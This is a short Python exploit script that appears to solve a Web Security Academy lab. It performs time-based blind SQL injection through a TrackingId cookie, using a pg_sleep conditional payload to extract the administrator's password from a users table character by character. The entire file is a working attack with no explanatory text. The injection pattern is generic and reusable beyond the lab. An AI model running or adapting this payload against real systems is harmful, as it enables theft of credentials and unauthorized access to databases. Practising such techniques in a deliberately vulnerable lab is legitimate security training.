#!/usr/bin/python3

import sys, signal, requests, string, time

def def_handler(sig, frame):
    print("\n[!] Exiting...\n")
    time.sleep(0.5)
    sys.exit(1)


url = "https://0a1a009d0490b1db86467f1a0077003f.web-security-academy.net"
characters = string.digits + string.ascii_lowercase


# def get_length():

def main(): 

    print("\n3. Blind SQLi: Time-Based")
    print("\n[*] Retrieving Administrator Password: ", end='')
    time.sleep(0.30)

    password = ""

    for position in range (1, 21):
        for char in characters:

            cookies = {
                "TrackingId": "E0iy017ge862WpZc'||(select case when substring(password,%d,1)='%s' then pg_sleep(1) else pg_sleep(0) end from users where username='administrator')-- -" % (position, char), 
                "session": "Nr2YaeCxw8ouxKgT9uDXJJPrG4WfGYOT"
            }

            init_time = time.time()

            r = requests.get(url, cookies=cookies)

            finish_time = time.time()

            total_time = finish_time - init_time

            if total_time >= 1:

                password += char
                print(char, end='')
                sys.stdout.flush()
                found_character = True
                break

    print("\n[+] Password succesfully obtained!!\n")
    time.sleep(0.5)
    sys.exit(0)


signal.signal(signal.SIGINT, def_handler)

if __name__ == '__main__':
    main()

